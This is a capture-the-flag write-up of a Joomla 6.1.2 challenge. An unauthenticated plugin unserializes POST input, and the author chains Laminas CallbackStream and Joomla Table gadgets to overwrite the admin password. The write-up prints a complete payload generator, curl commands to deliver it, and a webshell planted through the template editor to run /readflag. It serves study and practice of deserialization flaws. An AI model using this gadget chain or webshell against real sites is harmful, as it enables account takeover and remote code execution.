# Provisioneds

| Field | Details |
|-------|---------|
| **Challenge** | Provisioneds |
| **Platform** | Cyber Apocalypse CTF 2026: The Salt Crown |
| **Category** | Web (PHP Object Injection → RCE) |
| **Flag** | `HTB{j00mla_g4dg3t_ch41n_4r3_fun_r1ght?_7119abbc0b22bc3c31b2a601e7e0a89b}` |

---

## Overview

A Joomla 6.1.2 site with a custom system plugin (`plg_system_gatehouse`) that
calls `@unserialize()` on a POST parameter: no authentication required. The
challenge requires chaining Joomla's and Laminas's own vendor classes as gadgets
to reset the admin password, log in, and write a webshell via the template editor.

## The vulnerable plugin

`plg_system_gatehouse` hooks `onAfterRoute`, which fires on every request before
authentication is checked. It gates on three URL parameters and reads the `ledger`
POST body:

```php
// plugins/system/gatehouse/src/Extension/Gatehouse.php
public function onAfterRoute(AfterRouteEvent $event): void {
    $app = $event->getApplication();
    if (!$this->isAdminImportContext($app)) { return; }
    $ledger = $app->getInput()->getRaw('ledger', '');
    if (!is_string($ledger) || trim($ledger) === '') { return; }
    (new GatehouseRepository())->importMonthlyLedger($ledger);
}

private function isAdminImportContext($app): bool {
    if (!$app->isClient('administrator')) { return false; }
    $input = $app->getInput();
    return $input->getCmd('option') === 'com_provision'
        && $input->getCmd('view') === 'dispatch'
        && $input->getCmd('task') === 'ledger.import';
}
```

`isAdminImportContext` checks only URL structure, not credentials. Any HTTP client
can trigger it:

```
POST /administrator/index.php?option=com_provision&view=dispatch&task=ledger.import
```

Inside `importMonthlyLedger`, the repository calls `@unserialize($ledger)` and
then normalises the result:

```php
// plugins/system/gatehouse/src/Workflow/GatehouseRepository.php
$label = $this->clean((string) ($entry['month'] ?? $entry['label'] ?? ''));
```

The `(string)` cast on `$entry['month']` triggers `__toString()` on any object we
put there. That's the deserialization entry point.

## Finding a `__toString` gadget

The goal is to call a zero-argument method that writes to the database after the
initial `__toString` invocation. Joomla ships `Laminas\Diactoros\CallbackStream`
in its vendor bundle:

```php
// libraries/vendor/laminas/laminas-diactoros/src/CallbackStream.php
/** @var callable|null */
protected $callback;

public function __toString(): string { return $this->getContents(); }

public function getContents(): string {
    $callback = $this->detach();          // sets $this->callback = null, returns old value
    return $callback !== null ? (string) $callback() : '';
}
```

- No `__wakeup()` or `__unserialize()`: fully deserializable.
- `$callback` is `protected` with no PHP type hint, so deserialization can plant any
  value there, including an array callable like `[$object, 'methodName']`.

Setting `$callback = [$userTable, 'store']` makes `__toString()` call
`Table::store()` with zero arguments.

## The database update gadget

`Joomla\CMS\Table\Table::store()` updates the backing database row with the
object's current properties:

```php
// libraries/src/Table/Table.php
public function store($updateNulls = false) {
    $db = $this->getDatabase();
    $this->getDispatcher()->dispatch('onTableBeforeStore', $event);
    if ($this->hasPrimaryKey()) {
        $db->updateObject($this->_tbl, $this, $this->_tbl_keys, $updateNulls);
    }
    $this->getDispatcher()->dispatch('onTableAfterStore', $event);
}
```

`updateObject()` internally calls `getTableColumns()` first, which calls
`$this->connect()`. `MysqliDriver` has no `__wakeup()`, so we can serialize a
fully configured driver instance with valid credentials stored in `$this->options`.
When `connect()` runs during deserialization-time execution, it reconnects using
those embedded credentials: no live connection object required.

Two more things need to be satisfied:

**Dispatcher:** `Table::store()` dispatches events before and after the write. An
empty `Joomla\Event\Dispatcher` (no listeners) satisfies this without doing
anything. The `dispatcher` property is declared `private` inside
`DispatcherAwareTrait` but is scoped to the *using class* (`Table`), so it must
be set via `new ReflectionProperty(Table::class, 'dispatcher')`: not the trait
class.

**Primary key:** Using `_tbl_keys = ['username']` instead of `['id']` makes the
exploit independent of the admin user's numeric ID. It generates:

```sql
UPDATE j61_users SET password='...' WHERE username='adminuser'
```

## Building the payload

The payload generator runs inside a local copy of the container so Joomla's
autoloader resolves all classes:

```php
<?php
define('_JEXEC', 1);
define('JPATH_BASE', '/var/www/html');
require '/var/www/html/libraries/vendor/autoload.php';

use Joomla\CMS\Table\Table;
use Joomla\CMS\Table\User as UserTable;
use Joomla\Database\Mysqli\MysqliDriver;
use Joomla\Event\Dispatcher;
use Laminas\Diactoros\CallbackStream;

function noctor(string $class): object {
    return (new ReflectionClass($class))->newInstanceWithoutConstructor();
}
function setprop(object $obj, string $cls, string $prop, mixed $val): void {
    $rp = new ReflectionProperty($cls, $prop);
    $rp->setAccessible(true);
    $rp->setValue($obj, $val);
}

// --- MysqliDriver with embedded credentials ---
$db = noctor(MysqliDriver::class);
setprop($db, MysqliDriver::class, 'options', [
    'host'     => '127.0.0.1',
    'user'     => 'joomla',
    'password' => 'joomla',
    'database' => 'joomla',
    'prefix'   => 'j61_',
    'port'     => 3306,
    'socket'   => null,
    'utf8mb4'  => true,
]);
setprop($db, MysqliDriver::class, 'connection', null);   // connect() will reconnect
setprop($db, MysqliDriver::class, 'tablePrefix', 'j61_');
setprop($db, MysqliDriver::class, 'nameQuote', '`');
setprop($db, MysqliDriver::class, 'utf8mb4', true);

// --- empty Dispatcher ---
$dispatcher = noctor(Dispatcher::class);

// --- User table object targeting adminuser ---
// bcrypt of "hackme123"
$newHash = '$2y$12$E1vu7brTXxKDvR7s8ELsKeirVP8n4iK4MxyTRi21ixgONjBIZUH1S';

$userTable = noctor(UserTable::class);
setprop($userTable, Table::class, '_tbl',           '#__users');
setprop($userTable, Table::class, '_tbl_key',       'username');
setprop($userTable, Table::class, '_tbl_keys',      ['username']);
setprop($userTable, Table::class, '_autoincrement', true);
setprop($userTable, Table::class, '_trackAssets',   false);
setprop($userTable, Table::class, '_locked',        false);
setprop($userTable, Table::class, '_db',            $db);
setprop($userTable, Table::class, 'dispatcher',     $dispatcher); // MUST be Table::class
setprop($userTable, Table::class, '_errors',        []);
$userTable->username = 'adminuser';
$userTable->password = $newHash;

// --- CallbackStream: __toString() → store() ---
$cs = noctor(CallbackStream::class);
$rp = new ReflectionProperty(CallbackStream::class, 'callback');
$rp->setAccessible(true);
$rp->setValue($cs, [$userTable, 'store']);

// --- outer payload array ---
$payload = [[ 'month' => $cs, 'packages' => 100 ]];
file_put_contents('/tmp/pwn_payload.bin', serialize($payload));
```

Send the payload:

```bash
curl -s -X POST \
  "http://<target>/administrator/index.php?option=com_provision&view=dispatch&task=ledger.import" \
  --data-urlencode "ledger@/tmp/pwn_payload.bin"
```

Confirmation: the response contains two PHP warnings: one from `MysqliDriver`
about `utf8mb4` and one from `User` about an undefined property: both of which
prove the chain executed:

```
Warning: Undefined array key "utf8mb4" in MysqliDriver.php on line 811
Warning: Undefined property: Joomla\CMS\Table\User::$block in User.php on line 427
```

## Getting a shell

Log in to the Joomla admin panel with `adminuser` / `hackme123` and navigate to
**System → Templates → Cassiopeia → component.php**. The template editor renders
the file in a `<textarea name="jform[source]">`. Two hidden fields are also
required by the controller: without them the save silently does nothing:

```
jform[extension_id] = 245
jform[filename]     = /var/www/html/templates/cassiopeia/component.php
```

POST with all four fields:

```bash
curl -s -X POST \
  "http://<target>/administrator/index.php?option=com_templates&view=template&id=245&file=L2NvbXBvbmVudC5waHA&isMedia=0" \
  -b cookies.txt -c cookies.txt \
  -d "isMedia=0&task=template.apply&${CSRF}=1" \
  -d "jform[extension_id]=245" \
  --data-urlencode "jform[filename]=/var/www/html/templates/cassiopeia/component.php" \
  --data-urlencode 'jform[source]=<?php system($_GET["c"]); ?>'
```

Execute the SUID binary:

```
GET /templates/cassiopeia/component.php?c=/readflag
```

```
HTB{j00mla_g4dg3t_ch41n_4r3_fun_r1ght?_7119abbc0b22bc3c31b2a601e7e0a89b}
```

## Chain summary

```
POST /administrator/index.php?option=com_provision&view=dispatch&task=ledger.import
  └─ Gatehouse::onAfterRoute()          [no auth check]
       └─ @unserialize($ledger)
            └─ (string)$entry['month']
                 └─ CallbackStream::__toString()
                      └─ $callback()  →  UserTable::store()
                           └─ MysqliDriver::updateObject()
                                └─ getTableColumns() → connect()   [auto-reconnect]
                                     └─ UPDATE j61_users SET password=... WHERE username='adminuser'
```

## Takeaways

- `isAdminImportContext` is a naming trap: it checks URL structure only. Any
  unauthenticated client that knows the three parameter values can reach the
  `unserialize` call.
- `@unserialize()` on externally supplied data is unsafe even with the error
  suppressor. The `@` hides `__wakeup` exceptions but the deserialization and
  magic method invocations still occur.
- Vendor libraries included in a framework's bundle (here, Laminas Diactoros) are
  in scope for gadget hunting even if the application never calls them directly.
  `CallbackStream` is never used by this plugin: it's just present in the
  autoloader.
- In Joomla's `DispatcherAwareTrait`, the `$dispatcher` property is scoped
  `private` to the *using class*, not the trait itself. `ReflectionProperty` must
  target the using class (`Table::class`) or it creates a separate public dynamic
  property and the real private slot stays `null`.
- Joomla's template editor silently ignores a save if `jform[extension_id]` and
  `jform[filename]` are absent from the POST: both hidden fields are set by
  JavaScript in the browser and easy to miss when scripting the request with curl.
